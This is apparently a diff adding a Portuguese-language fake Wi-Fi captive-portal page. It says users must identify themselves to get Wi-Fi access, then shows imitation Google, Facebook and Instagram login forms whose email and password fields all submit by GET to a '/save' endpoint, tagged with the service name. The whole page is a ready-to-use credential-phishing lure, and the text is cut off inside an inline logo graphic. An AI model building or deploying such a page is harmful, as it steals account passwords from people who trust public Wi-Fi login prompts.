@@ -1,0 +1,542 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login</title>
+
+  <style>
+    body {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      height: 100%;
+      overflow: scroll;
+      margin: 0;
+      padding: 0;
+      background-size: cover;
+      font-family: 'Open Sans', sans-serif;
+      box-sizing: border-box;
+    }
+
+    .box {
+      width: 30rem;
+      padding: 3.5rem;
+      box-sizing: border-box;
+      border: 1px solid #dadce0;
+      -webkit-border-radius: 8px;
+      border-radius: 8px;
+      border-top-left-radius: 0;
+    }
+
+    .box h2 {
+      margin: 0px 0 -0.125rem;
+      padding: 0;
+      text-align: center;
+      color: #202124;
+      font-size: 24px;
+      font-weight: 400;
+    }
+
+    .box .logo {
+      display: flex;
+      flex-direction: row;
+      justify-content: center;
+      margin-bottom: 16px;
+
+    }
+
+    .box p {
+      font-size: 16px;
+      font-weight: 400;
+      letter-spacing: 1px;
+      line-height: 1.5;
+      margin-bottom: 24px;
+      text-align: center;
+    }
+
+    .box .inputBox {
+      position: relative;
+    }
+
+    .box .inputBox input {
+      width: 93%;
+      padding: 1.1rem 10px;
+      font-size: 1rem;
+      letter-spacing: 0.062rem;
+      border: 1px solid #ccc;
+      background: transparent;
+      border-radius: 4px;
+    }
+
+    .logo img {
+      width: 100px;
+    }
+
+    .box .inputBox label {
+      position: absolute;
+      top: 10px;
+      left: 10px;
+      padding: 0.625rem 0;
+      font-size: 1rem;
+      color: gray;
+      pointer-events: none;
+      transition: 0.5s;
+    }
+
+    .box .inputBox input:focus~label,
+    .box .inputBox input:valid~label,
+    .box .inputBox input:not([value=""])~label {
+      top: -1.125rem;
+      left: 10px;
+      color: #1a73e8;
+      font-size: 0.75rem;
+      background-color: #fff;
+      height: 10px;
+      padding-left: 5px;
+      padding-right: 5px;
+    }
+
+    .box .inputBox input:focus {
+      outline: none;
+      border: 2px solid #1a73e8;
+    }
+
+    .box input[type="submit"] {
+      border: none;
+      outline: none;
+      color: #fff;
+      background-color: #1a73e8;
+      padding: 0.625rem 1.25rem;
+      cursor: pointer;
+      border-radius: 0.312rem;
+      font-size: 1rem;
+      float: right;
+    }
+
+    .box input[type="submit"]:hover {
+      background-color: #287ae6;
+      box-shadow: 0 1px 1px 0 rgba(66, 133, 244, 0.45), 0 1px 3px 1px rgba(66, 133, 244, 0.3);
+    }
+
+    .DRS7Fe button {
+      background: none;
+      font-size: 15px;
+      border: 0;
+      color: #1a73e8;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    .vwtvsf {
+      margin-top: 32px;
+    }
+
+    .NlWrkb {
+      text-decoration: none;
+      color: #1a73e8;
+    }
+
+    .ck6P8 {
+      font-size: 15px;
+      color: #5f6368;
+    }
+
+    .ck6P8 a {
+      text-decoration: none;
+      color: #1a73e8;
+    }
+
+    @media only screen and (max-width: 600px) {
+      .box {
+        margin: 0 20px;
+        width: calc(100vw - 40px);
+        padding: 20px;
+      }
+    }
+
+    .options .opt-log {
+      transition: all .3s;
+      cursor: pointer;
+      border: 1px solid transparent;
+      border-bottom: 0;
+      border-top-left-radius: 10px;
+      border-top-right-radius: 10px;
+      padding: 4px;
+    }
+
+    .options .opt-log.selected {
+      position: relative;
+      top: 1px;
+      border-color: #dadce0;
+      background-color: white;
+    }
+
+    .options .opt-log svg,
+    .options .opt-log path {
+      width: 35px;
+      height: 35px;
+    }
+
+
+    .container {
+      display: flex;
+      justify-content: space-around;
+      align-items: center;
+      width: 100%;
+    }
+
+    h1 {
+      color: #1877f2;
+      font-size: 2.5rem;
+      margin: 0;
+    }
+
+    .login-box {
+      background-color: #fff;
+      padding: 20px;
+      border-radius: 8px;
+      border: 1px solid #dadce0;
+      width: 300px;
+      text-align: center;
+      margin: 0 20px;
+
+      @media only screen and (max-width: 600px) {
+        width: calc(100% - 80px);
+      }
+
+    }
+
+    .login-box input {
+      width: calc(100% - 40px);
+      padding: 15px;
+      margin: 10px 0;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 1rem;
+    }
+
+    .login-box button {
+      width: 100%;
+      padding: 15px;
+      background-color: #1877f2;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      font-size: 1.25rem;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .login-box button:hover {
+      background-color: #166fe5;
+    }
+
+    .login-box a {
+      display: block;
+      margin: 15px 0;
+      color: #1877f2;
+      text-decoration: none;
+      font-size: 0.9rem;
+    }
+
+    .login-box a:hover {
+      text-decoration: underline;
+    }
+
+
+    .login-container svg,
+    .login-container path {
+      width: 175px;
+    }
+
+    .login-container {
+      background-color: #fff;
+      padding: 40px;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      text-align: center;
+      margin: 0 20px;
+      width: 300px;
+
+      @media only screen and (max-width: 600px) {
+        width: calc(100% - 120px);
+      }
+
+    }
+
+    .input-field {
+      width: calc(100% - 20px);
+      padding: 10px;
+      margin-bottom: 5px;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      font-size: 14px;
+    }
+
+    .login-button {
+      width: 100%;
+      padding: 10px;
+      background-color: #0095f6;
+      color: #fff;
+      border: none;
+      border-radius: 10px;
+      font-size: 14px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    .login-button:hover {
+      background-color: #0077c2;
+    }
+
+    .divider {
+      display: flex;
+      gap: 10px;
+      align-items: center;
+      justify-content: center;
+      margin: 20px 0;
+      color: #8e8e8e;
+      font-size: 14px;
+    }
+
+    .divider span {
+      width: 100%;
+      height: 1px;
+      background-color: #8e8e8e;
+    }
+
+    .facebook-login {
+      color: #385185;
+      text-decoration: none;
+      font-size: 14px;
+      display: block;
+      margin-bottom: 20px;
+      user-select: none;
+      cursor: pointer;
+    }
+
+    .forgot-password {
+      color: #00376b;
+      text-decoration: none;
+      font-size: 12px;
+      user-select: none;
+    }
+
+    .facebook-form,
+    .instagram-form {
+      display: none;
+    }
+  </style>
+
+</head>
+
+<body>
+
+  <div class="msg" style="max-width: 412px;margin-top: 20px; font-size: 22px;text-align: center;margin-bottom: 50px; padding: 0 20px;">Precisamos identificar você para liberar o acesso ao Wi-Fi.</div>
+
+  <div class="box-cont">
+
+    <div class="options" style="display: flex;align-items: center; margin: 0 20px;">
+      <div class="google opt-log selected" id="0"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="48px" height="48px">
+          <path fill="#FFC107" d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12c0-6.627,5.373-12,12-12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24c0,11.045,8.955,20,20,20c11.045,0,20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z" />
+          <path fill="#FF3D00" d="M6.306,14.691l6.571,4.819C14.655,15.108,18.961,12,24,12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z" />
+          <path fill="#4CAF50" d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.19-5.238C29.211,35.091,26.715,36,24,36c-5.202,0-9.619-3.317-11.283-7.946l-6.522,5.025C9.505,39.556,16.227,44,24,44z" />
+          <path fill="#1976D2" d="M43.611,20.083H42V20H24v8h11.303c-0.792,2.237-2.231,4.166-4.087,5.571c0.001-0.001,0.002-0.001,0.003-0.002l6.19,5.238C36.971,39.205,44,34,44,24C44,22.659,43.862,21.35,43.611,20.083z" />
+        </svg></div>
+      <div class="face opt-log" id="1"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="48px" height="48px">
+          <linearGradient id="Ld6sqrtcxMyckEl6xeDdMa" x1="9.993" x2="40.615" y1="9.993" y2="40.615" gradientUnits="userSpaceOnUse">
+            <stop offset="0" stop-color="#2aa4f4" />
+            <stop offset="1" stop-color="#007ad9" />
+          </linearGradient>
+          <path fill="url(#Ld6sqrtcxMyckEl6xeDdMa)" d="M24,4C12.954,4,4,12.954,4,24s8.954,20,20,20s20-8.954,20-20S35.046,4,24,4z" />
+          <path fill="#fff" d="M26.707,29.301h5.176l0.813-5.258h-5.989v-2.874c0-2.184,0.714-4.121,2.757-4.121h3.283V12.46 c-0.577-0.078-1.797-0.248-4.102-0.248c-4.814,0-7.636,2.542-7.636,8.334v3.498H16.06v5.258h4.948v14.452 C21.988,43.9,22.981,44,24,44c0.921,0,1.82-0.084,2.707-0.204V29.301z" />
+        </svg></div>
+      <div class="instagram opt-log" id="2"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="48px" height="48px">
+          <radialGradient id="yOrnnhliCrdS2gy~4tD8ma" cx="19.38" cy="42.035" r="44.899" gradientUnits="userSpaceOnUse">
+            <stop offset="0" stop-color="#fd5" />
+            <stop offset=".328" stop-color="#ff543f" />
+            <stop offset=".348" stop-color="#fc5245" />
+            <stop offset=".504" stop-color="#e64771" />
+            <stop offset=".643" stop-color="#d53e91" />
+            <stop offset=".761" stop-color="#cc39a4" />
+            <stop offset=".841" stop-color="#c837ab" />
+          </radialGradient>
+          <path fill="url(#yOrnnhliCrdS2gy~4tD8ma)" d="M34.017,41.99l-20,0.019c-4.4,0.004-8.003-3.592-8.008-7.992l-0.019-20	c-0.004-4.4,3.592-8.003,7.992-8.008l20-0.019c4.4-0.004,8.003,3.592,8.008,7.992l0.019,20	C42.014,38.383,38.417,41.986,34.017,41.99z" />
+          <radialGradient id="yOrnnhliCrdS2gy~4tD8mb" cx="11.786" cy="5.54" r="29.813" gradientTransform="matrix(1 0 0 .6663 0 1.849)" gradientUnits="userSpaceOnUse">
+            <stop offset="0" stop-color="#4168c9" />
+            <stop offset=".999" stop-color="#4168c9" stop-opacity="0" />
+          </radialGradient>
+          <path fill="url(#yOrnnhliCrdS2gy~4tD8mb)" d="M34.017,41.99l-20,0.019c-4.4,0.004-8.003-3.592-8.008-7.992l-0.019-20	c-0.004-4.4,3.592-8.003,7.992-8.008l20-0.019c4.4-0.004,8.003,3.592,8.008,7.992l0.019,20	C42.014,38.383,38.417,41.986,34.017,41.99z" />
+          <path fill="#fff" d="M24,31c-3.859,0-7-3.14-7-7s3.141-7,7-7s7,3.14,7,7S27.859,31,24,31z M24,19c-2.757,0-5,2.243-5,5	s2.243,5,5,5s5-2.243,5-5S26.757,19,24,19z" />
+          <circle cx="31.5" cy="16.5" r="1.5" fill="#fff" />
+          <path fill="#fff" d="M30,37H18c-3.859,0-7-3.14-7-7V18c0-3.86,3.141-7,7-7h12c3.859,0,7,3.14,7,7v12	C37,33.86,33.859,37,30,37z M18,13c-2.757,0-5,2.243-5,5v12c0,2.757,2.243,5,5,5h12c2.757,0,5-2.243,5-5V18c0-2.757-2.243-5-5-5H18z" />
+        </svg></div>
+    </div>
+
+    <div class='box google-form'>
+
+      <div class='logo'>
+        <img src='data:image/png;base64,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'>
+      </div>
+
+      <h2>Fazer Login</h2>
+      <p>Use sua conta do Google</p>
+
+      <form action="/save" method="GET">
+
+        <input type="hidden" name="rede" value="Google">
+
+        <div class='inputBox'>
+          <input type='email' name='email' style='margin-bottom: 1.1rem;' required onkeyup='this.setAttribute("value", this.value);' value="">
+          <label>Email</label>
+        </div>
+
+        <div class='inputBox'>
+          <input type='password' name='pass' required onkeyup='this.setAttribute("value", this.value);' value=''>
+          <label>Senha</label>
+        </div>
+
+        <div class="DRS7Fe"><button type="button">Esqueceu seu e-mail?</button></div>
+
+        <div class="vwtvsf">
+          <div class="ck6P8">Está com dificuldades para entrar? Escolha uma outra forma de login acima.
+          </div>
+        </div>
+
+        <div style='display:flex;align-items:center;justify-content: space-between;margin-top:32px;'>
+          <span><a href="" class="NlWrkb">Criar conta</a></span>
+          <input type='submit' value='Próximo'>
+        </div>
+
+      </form>
+
+    </div>
+
+    <div class="container facebook-form">
+      <div class="login-box">
+        <h1>facebook</h1>
+        <form action="/save" method="GET">
+          <input type="hidden" name="rede" value="Facebook">
+          <input type="email" name='email' required onkeyup='this.setAttribute("value", this.value);' value="" placeholder="Email ou telefone">
+          <input type="password" name="pass" required onkeyup='this.setAttribute("value", this.value);' value="" placeholder="Senha">
+          <button>Entrar</button>
+        </form>
+        <a href="#">Esqueceu a senha?</a>
+      </div>
+    </div>
+
+    <div class="login-container instagram-form">
+      <svg xmlns="http://www.w3.org/2000/svg" version="1.0" width="175.000000pt" height="51.000000pt" viewBox="0 0 175.000000 51.000000" preserveAspectRatio="xMidYMid meet">
+        <metadata>
+          Created by potrace 1.10, written by Peter Selinger 2001-2011
+        </metadata>
+        <g transform="translate(0.000000,51.000000) scale(0.100000,-0.100000)" fill="#000000" stroke="none">
+          <path d="M47 470 c-48 -57 -54 -148 -10 -164 22 -9 27 -1 14 22 -6 12 -11 30 -11 41 0 28 30 101 41 101 12 0 12 -276 0 -318 -11 -37 -1 -41 28 -11 25 27 33 92 29 239 l-3 115 -31 3 c-25 2 -37 -3 -57 -28z" />
+          <path d="M560 465 c0 -33 -2 -36 -21 -30 -14 5 -25 2 -30 -6 -15 -23 -10 -29 21 -29 l30 0 0 -60 c0 -39 -6 -73 -17 -93 l-18 -32 -3 27 c-2 17 -16 38 -37 54 -31 24 -33 27 -20 51 16 31 12 43 -15 43 -25 0 -51 -38 -44 -66 6 -23 -39 -114 -57 -114 -4 0 -9 37 -11 81 -2 65 -7 84 -21 93 -26 17 -49 -3 -74 -65 l-22 -54 -3 60 c-2 48 -7 60 -21 63 -16 3 -17 -6 -15 -110 3 -105 4 -113 23 -113 15 0 21 9 27 42 8 50 41 127 58 138 8 5 10 -10 5 -61 -7 -73 4 -124 28 -124 17 0 57 43 87 93 l22 38 25 -23 c35 -33 27 -63 -17 -63 -43 0 -48 -25 -8 -39 36 -13 94 13 110 49 14 31 28 32 28 2 0 -24 28 -57 48 -57 6 0 22 15 36 32 18 23 26 28 26 16 0 -18 36 -48 58 -48 7 0 24 11 37 25 17 16 25 19 25 10 0 -23 36 -38 60 -25 11 6 20 16 20 22 0 6 10 2 23 -10 29 -27 38 -27 71 -1 43 33 30 2 -18 -44 -56 -53 -68 -93 -36 -119 30 -24 53 -23 86 5 23 20 27 33 32 97 4 60 10 82 33 113 15 21 33 54 39 73 7 21 18 34 29 34 15 0 16 -9 13 -66 -4 -57 -2 -68 19 -90 26 -28 36 -30 60 -8 16 15 20 15 41 0 31 -22 45 -20 73 10 19 20 25 23 25 11 0 -9 9 -21 19 -27 25 -13 27 -13 46 6 15 15 17 15 29 -1 22 